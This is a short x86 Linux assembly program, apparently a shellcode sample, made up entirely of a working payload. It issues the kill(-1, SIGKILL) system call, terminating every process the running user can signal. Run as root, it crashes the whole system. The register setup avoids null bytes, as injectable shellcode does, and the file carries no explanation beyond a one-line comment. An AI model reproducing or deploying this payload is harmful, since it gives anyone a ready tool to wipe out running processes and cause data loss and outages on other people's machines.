section .text

global _start

 _start:

  ; kill(-1, SIGKILL)

       xor ebx,ebx
       mul ebx
       add al,0x25
       dec ebx
       sub ecx,ecx
       mov cl,9
       int 0x80
